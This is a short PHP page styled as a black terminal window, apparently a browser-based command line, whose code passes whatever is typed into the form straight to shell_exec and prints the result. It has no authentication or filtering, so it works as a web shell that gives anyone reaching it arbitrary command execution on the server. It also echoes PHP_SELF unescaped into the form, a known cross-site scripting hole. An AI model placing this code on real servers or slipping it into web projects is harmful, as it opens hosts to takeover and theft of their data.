<!DOCTYPE html>
<html>
<head>
	<title>commandLine</title>
	<style type="text/css">
		*{
			margin: 0;
			padding: 0;
		}
		.back{
			background: black;
			color: white;
			position: fixed;
			overflow-y: scroll;
			height: 100%;
			width: 100%;
			color: white;
		}
		#result{
			background: black;
			
			border: none;
			height: 100%;
			width: 100%;
			color: white;
			z-index: 1;
		}
		#command{
			background: black;
			border: 1px solid green;
			height: 20px;
			width: 98%;
			color: white;
			z-index: 1;	
			display: inline-block;
			float: right;
			border-left: none;
			resize: none;
		}
		#number_sign{
			display: inline-block;
			width: 2px;
			height: 20px;
		}
		#result_result{
			margin: 15px;
			color: green;
		}
		#submit{
			display: none;
		}
	</style>
	<script type="text/javascript">
		function null_textarea(){
			var input = document.getElementById("command");
			input.value = "";
			input.focus();

		}
		function submit_with_enter(){
			var input = document.getElementById("command");

			// Execute a function when the user releases a key on the keyboard
			input.addEventListener("keyup", function(event) {
			// Number 13 is the "Enter" key on the keyboard
			if (event.keyCode === 13) {
			// Cancel the default action, if needed
			event.preventDefault();
			// Trigger the button element with a click
			document.getElementById("submit").click();
			}
			});
		}
	</script>
</head> 
<body onload="null_textarea();">
	<div class="back">
		<form action="<?php echo $_SERVER['PHP_SELF']; ?>" id="form" method="post">
			<div id="result">
			<div id="number_sign">#&nbsp;</div><textarea type="text" onkeyup="submit_with_enter();" name="command" id="command" maxlength="200">
			</textarea>		
				<div id="result_result">
					<?php 
							if (isset($_POST["submit"])) {
								$command = $_POST["command"];
								echo nl2br(shell_exec($command));
								$command = null;
							}
					?>
				</div>
			</div>
			<input type="submit" name="submit" id="submit" />		
		</form>
	</div>
</body>
</html>
